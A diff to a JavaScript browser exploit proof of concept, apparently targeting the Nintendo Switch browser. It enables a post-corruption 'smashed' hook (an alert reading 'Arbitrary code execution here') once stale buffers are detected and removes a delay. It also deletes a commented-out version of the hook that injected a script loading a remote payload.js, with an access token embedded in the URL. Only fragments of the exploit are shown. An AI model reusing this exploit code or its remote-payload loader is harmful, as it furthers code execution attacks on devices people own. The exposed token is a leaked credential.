@@ -98,6 +98,10 @@ function allocbufptrs() {
 	}
 }
 
+function smashed(stl) {
+	alert("Arbitrary code execution here.")
+	return 0;
+}
 
 
 
@@ -150,7 +154,6 @@ function go_() {
 		return;
 	}
 	
-	sleep(1000);
 	if(document != document){
 		for(var i = 0; i < 5; i++){
 			var x=0;
@@ -216,7 +219,7 @@ function go_() {
  				bufs.push(stale)
 				
  				if (smsh.length != 0x10) {
- 					//smashed(stale[0]);
+ 					smashed(stale[0]);
  				}
 				alert("3");
 				//alert("4");
@@ -238,16 +241,6 @@ function go_() {
 		document.location.reload();
 	}, 500);
 }
-
-/*
-function smashed(stl) {
-	alert("Arbitrary code execution here.")
-	var x = document.createElement('script');		
-	x.src = 'https://raw.githubusercontent.com/slimsag/switchpoc/master/payload.js?token=AIMi8uOhXiZKZj_G3GIby3vXtv0ultOiks5Yz0qNwA%3D%3D&cb=' + math.random();		
-	document.getElementsByTagName("head")[0].appendChild(x);
-	return 0;
-}
-*/
 
 function go() {
 	dgc();
